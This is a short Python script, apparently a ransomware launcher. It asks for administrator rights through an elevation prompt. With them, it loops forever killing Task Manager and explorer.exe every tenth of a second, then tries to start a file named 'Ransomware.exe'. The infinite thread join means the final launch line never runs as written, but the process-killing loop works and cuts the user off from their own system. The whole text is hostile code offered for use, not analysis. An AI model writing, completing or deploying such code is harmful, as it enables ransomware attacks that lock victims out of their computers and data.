from colored import fg, attr, bg
import os, time, sys, ctypes, threading

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def KillTaskManager():
    while True:
        os.system("taskkill /F /IM Taskmgr.exe")
        os.system("taskkill /F /IM explorer.exe")
        time.sleep(0.1)

killtaskmanadger = threading.Thread(target=KillTaskManager)

if is_admin():
    killtaskmanadger.start()
    killtaskmanadger.join()
    os.system("start Ransomware.exe")
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)